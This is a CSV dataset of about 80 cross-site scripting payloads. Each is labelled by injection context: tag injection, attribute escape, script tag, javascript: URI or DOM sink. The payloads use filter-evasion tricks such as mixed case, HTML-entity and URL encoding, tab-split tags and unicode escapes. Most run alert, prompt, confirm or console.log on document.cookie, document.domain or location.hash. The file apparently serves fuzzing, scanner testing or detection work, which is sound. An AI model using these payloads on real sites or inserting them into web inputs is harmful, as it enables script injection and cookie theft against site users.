payload,context
%22><svg ontoggle=alert(1)>,tag_injection
%27 onload=confirm(%27XSS%27) %27,attribute_escape
""" oNfoCus=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) auTofOcuS=""",attribute_escape
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection
%22 onclick=confirm(1) %22,attribute_escape
"""%3E%3Csvg onerror=prompt(document.cookie)%3E",tag_injection
"""><Svg onMouSeeNteR=pRomPt('XSS')>",tag_injection
' onclick=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
"' onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"' onmouseenter=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
<svG oNerRor=alErt(loCatIon.haSh)/>,tag_injection
"""%3E%3Csvg ontoggle=alert(document.cookie)%3E",tag_injection
<svG oNerRor=alErt('XSS')/>,tag_injection
' onbegin=alert(document.cookie) ',attribute_escape
' onload=alert(document.cookie) ',attribute_escape
"' onfocus=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
"<scr	ipt>/x/confirm(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
j&#97;vascr	ipt:alert('XSS'),js_uri
""" ontoggle=alert('XSS') """,attribute_escape
<svg onmouseenter=console.log('XSS')>,tag_injection
%3Csvg onload=confirm('XSS')%3E,tag_injection
' onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) ',attribute_escape
"<svg onbegin=confirm(String.fromCharCode(88,83,83))/>",tag_injection
<svG oNloAd=AleRt(DocUmeNt.DomAin)/>,tag_injection
<svg onmouseover=console.log(%27XSS%27)>,tag_injection
""" onclick=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
<svg onmouseenter=\u0061lert(location.hash)>,tag_injection
"' oNclIck=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
%3Csvg onbegin=console.log(1)/%3E,tag_injection
%3Csvg onerror=confirm(location.hash)/%3E,tag_injection
"<svG oNbeGin=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
"%22 onfocus=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
"""><svg onclick=alert(document.domain)>",tag_injection
"""><Img onLoaD=aLerT(lOcaTioN.hAsh)>",tag_injection
<svg onerror=prompt('XSS')/>,tag_injection
""" onbegin=console.log(location.hash) """,attribute_escape
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%22><svg onclick=alert(1)>,tag_injection
<svG oNtoGglE=cOnsOle.loG(dOcuMenT.cOokIe)/>,tag_injection
"javascript:confirm(String.fromCharCode(88,83,83))",js_uri
""" oNfoCus=alErt(doCumEnt.coOkiE) """,attribute_escape
"""%3E%3Csvg ontoggle=confirm(document.cookie)%3E",tag_injection
<svG oNbeGin=coNsoLe.Log(loCatIon.haSh)>,tag_injection
"j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
%22><svg onclick=prompt(document.domain)>,tag_injection
%27 onload=console.log(location.hash) %27,attribute_escape
""" oNfoCus=prOmpT(dOcuMenT.dOmaIn) auTofOcuS=""",attribute_escape
"""><svg onfocus=alert(String.fromCharCode(88,83,83))>",tag_injection
' onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
<svG oNtoGglE=aLerT(lOcaTioN.hAsh)>,tag_injection
<svg onfocus=alert(document.domain)>,tag_injection
"%22><svg onmouseenter=alert(String.fromCharCode(88,83,83))>",tag_injection
"""><Svg onBegIn=ConSolE.lOg(LocAtiOn.HasH)>",tag_injection
javascr	ipt:confirm(location.hash),js_uri
<scr	ipt>//prompt(1)</scr	ipt>,script_injection
"""><Svg onBegIn=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"""><svg onclick=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection
j&#97;vascript:alert(%27XSS%27),js_uri
"""><svg onclick=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
""" onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"""><svg onlo&#97;d=confirm(1)>",tag_injection
<svg onerror=confirm(document.cookie)/>,tag_injection
<svG oNtoGglE=cOnfIrm(loCatIon.haSh)/>,tag_injection
"document.write(""%3Cimg src=x onerror=prompt(document.domain)%3E"")",dom_sink
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnsOle.loG(1)>"")",dom_sink
%22><svg onmouseenter=alert(1)>,tag_injection
<svg onfocus=alert(%27XSS%27)/>,tag_injection
""" oNbeGin=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
"<svg onbegin=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
"""><svg onb&#101;gin=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
"""><svg onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<svg onmous&#101;ov&#101;r=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
j&#97;v&#97;script:consol&#101;.log(1),js_uri
<svg onerror=alert(1)>,tag_injection
<svg onmouseover=confirm(location.hash)>,tag_injection
<scRipT>cOnsOle.loG(dOcuMenT.cOokIe)</sCriPt>,script_injection
<svg onerror=\u0061lert(document.cookie)>,tag_injection
"""><svg ontoggl&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"&#101;v&#97;l(""&#97;l&#101;rt(docum&#101;nt.cooki&#101;)"")",dom_sink
<svg onb&#101;gin=confirm('XSS')>,tag_injection
j&#97;vascript:prompt('XSS'),js_uri
